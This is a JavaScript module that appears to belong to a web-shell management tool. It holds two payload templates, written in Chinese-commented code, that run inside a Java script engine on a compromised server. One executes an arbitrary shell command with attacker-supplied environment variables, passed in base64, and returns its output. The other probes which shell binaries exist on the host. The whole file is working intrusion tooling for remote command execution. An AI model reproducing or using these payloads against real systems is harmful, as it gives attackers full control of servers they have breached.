/**
 * 虚拟终端命令执行
 */

module.exports = (arg1, arg2, arg3) => ({
  exec: {
    _: `
    function ExecuteCommandCode(cmdPath, command, envstr) {
      var sb = new StringBuffer();
      var split = isWin() ? "/c" : "-c";
      var s = [cmdPath, split, command];
      var readonlyenv = System.getenv();
      var cmdenv = new HashMap(readonlyenv);
      var envs = envstr.split("\\|\\|\\|asline\\|\\|\\|");
      for (var i = 0; i < envs.length; i++) {
        var es = envs[i].split("\\|\\|\\|askey\\|\\|\\|");
        if (es.length == 2) {
          cmdenv.put(es[0], es[1]);
        }
      }
      var e = [];
      var i = 0;
      var iter = cmdenv.keySet().iterator();
      while (iter.hasNext()) {
        var key = iter.next();
        var val = cmdenv.get(key);
        e[i] = key + "=" + val;
        i++;
      }
      p = java.lang.Runtime.getRuntime().exec(s, e);
      CopyInputStream(p.getInputStream(), sb);
      CopyInputStream(p.getErrorStream(), sb);
      return sb;
    }
    function CopyInputStream(is, sb) {
      var l;
      var br = new BufferedReader(new InputStreamReader(is, cs));
      while ((l = br.readLine()) != null) {
        sb.append(l + "\\r\\n");
      }
      br.close();
    }
    function isWin() {
      var osname = System.getProperty("os.name");
      osname = osname.toLowerCase();
      return osname.startsWith("win");
    }
    
    var cmdPath = decode("#{newbase64::bin}");
    var command = decode("#{newbase64::cmd}");
    var envstr = decode("#{newbase64::env}");
    
    output.append(ExecuteCommandCode(cmdPath, command, envstr));
    `.replace(/\n\s+/g, ""),
  },
  listcmd: {
    _: `
    function ListcmdCode(binarrstr) {
      var binarr = binarrstr.split(",");
      var ret = "";
      for (var i = 0; i < binarr.length; i++) {
        var f = new File(binarr[i]);
        if (f.exists() && !f.isDirectory()) {
          ret += binarr[i] + "\\t1\\n";
        } else {
          ret += binarr[i] + "\\t0\\n";
        }
      }
      return ret;
    }
    var z1 = decode("#{newbase64::binarr}");
    output.append(ListcmdCode(z1));
    `.replace(/\n\s+/g, ""),
  },
});
